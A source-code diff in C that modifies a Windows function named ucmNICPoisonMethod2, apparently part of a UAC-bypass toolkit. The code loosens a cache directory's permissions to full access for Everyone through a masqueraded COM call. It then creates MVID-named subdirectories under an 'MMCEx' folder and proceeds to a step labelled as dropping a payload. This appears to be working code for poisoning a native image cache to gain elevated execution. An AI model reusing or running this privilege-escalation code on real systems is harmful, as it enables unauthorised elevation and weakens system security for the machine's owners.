@@ -2080,9 +2080,9 @@ NTSTATUS ucmNICPoisonMethod2(
     WCHAR szFileName[MAX_PATH * 2];
     WCHAR szTargetDir[MAX_PATH * 2];
     WCHAR szCacheDir[MAX_PATH * 2];
+    WCHAR szMVID[64];
 
     LPWSTR oldSecurity = NULL;
-    LPWSTR lpMVID = NULL;
     SIZE_T dirLen;
     GUID targetMVID;
 
@@ -2107,22 +2107,22 @@ NTSTATUS ucmNICPoisonMethod2(
         _strcat(szCacheDir, TEXT("_32"));
 #endif
        
-
-
-/*        if (RPC_S_OK == UuidCreate(&targetMVID)) {
-
-            if (UuidToString((UUID*)&targetMVID, &lpMVID) != RPC_S_OK)
-                break;
-
-        }*/
-
-        MethodResult = ucmxGenerateAUX(TEXT("MMCEx"), &auxData, &auxDataSize, NULL);
+        MethodResult = ucmxGenerateAUX(TEXT("MMCEx"), &auxData, &auxDataSize, &targetMVID);
         if (!NT_SUCCESS(MethodResult))
             break;
 
-        UuidCreateNil(&targetMVID);
-        if (UuidToString((UUID*)&targetMVID, &lpMVID) != RPC_S_OK)
-            break;
+        wsprintf(szMVID, L"%08x%04x%04x%02x%02x%02x%02x%02x%02x%02x%02x",
+            targetMVID.Data1, 
+            targetMVID.Data2, 
+            targetMVID.Data3,
+            targetMVID.Data4[0],
+            targetMVID.Data4[1],
+            targetMVID.Data4[2],
+            targetMVID.Data4[3],
+            targetMVID.Data4[4],
+            targetMVID.Data4[5],
+            targetMVID.Data4[6],
+            targetMVID.Data4[7]);      
 
         //
         // Remember old directory security permissions.
@@ -2143,7 +2143,7 @@ NTSTATUS ucmNICPoisonMethod2(
         if (!ucmMasqueradedSetObjectSecurityCOM(szCacheDir,
             DACL_SECURITY_INFORMATION,
             SE_FILE_OBJECT,
-            T_SDDL_ALL_FOR_EVERYONE))
+            T_SDDL_EVERYONE_FULL_ACCESS))
         {
             break;
         }
@@ -2175,19 +2175,20 @@ NTSTATUS ucmNICPoisonMethod2(
         // 1. MMCEx
         //
         if (!CreateDirectory(szFileName, NULL))
-            if (GetLastError() != ERROR_ALREADY_EXISTS)
+            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                 break;
+            }
 
         //
         // 2. Subdirectory <MVID>
         //
         supPathAddBackSlash(szFileName);
-        _strcat(szFileName, lpMVID);
-        //_strcat(szFileName, L"bbf7c7a9435b47313281e9dbd85f19a6");
+        _strcat(szFileName, szMVID);
         //_strcat(szFileName, L"DEADBEEFDEADBEEFDEADBEEFDEADBEEF");
         if (!CreateDirectory(szFileName, NULL))
-            if (GetLastError() != ERROR_ALREADY_EXISTS)
+            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                 break;
+            }
 
         //
         // 3. Drop payload.
@@ -2262,15 +2263,11 @@ NTSTATUS ucmNICPoisonMethod2(
 
     }
 
-    if (lpMVID)
-        RpcStringFree(&lpMVID);
-
     if (auxData)
         supHeapFree(auxData);
 
-#ifdef _DEBUG
-    supSetGlobalCompletionEvent();
-#endif
+    if (!NT_SUCCESS(MethodResult)) 
+        supSetGlobalCompletionEvent();
 
     return MethodResult;
 }
